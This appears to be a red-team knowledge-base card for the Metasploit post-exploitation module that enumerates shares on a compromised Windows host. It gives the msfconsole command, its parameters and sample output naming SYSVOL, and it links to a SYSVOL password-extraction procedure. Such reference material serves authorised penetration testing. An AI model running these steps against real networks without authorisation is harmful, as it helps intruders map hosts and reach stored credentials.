---
id: c721898e-e1fc-4d80-99e7-4329d273df48
name: Metasploit Enum Windows Shares
type: command
executor: msfconsole
data: use post/windows/gather/enum_shares; set SESSION $_SESSION_ID; run
output: null
created_at: '2023-04-06T03:56:03.529901+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - post-exploitation
  - shares
verified: true
validated: true
---

# Metasploit Enum Windows Shares

## Command

```msfconsole
use post/windows/gather/enum_shares; set SESSION $_SESSION_ID; run
```

## Description

Post-exploitation Metasploit module to enumerate local and remote shares from a compromised Windows host, often revealing SYSVOL in domain contexts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| SESSION ($_SESSION_ID) | Meterpreter session ID | Yes |
| ACTION | Enumerate local or remote shares | No (default: local) |

## Examples

### Basic Usage

```msfconsole
use post/windows/gather/enum_shares; set SESSION 1; run
```

## Expected Output

[*] Running module against session 1...  
[+] Share: IPC$, Type: IPC, Path:  
[+] Share: ADMIN$, Type: Disk, Path: C:\Windows\system32  
[+] Share: SYSVOL, Type: Disk, Path: \\domain.com\SYSVOL

## Related

- [[procedures/Automated-Password-Extraction-from-SYSVOL-and-Group-Policy-Preferences]]
- [[tools/Metasploit-Framework]]
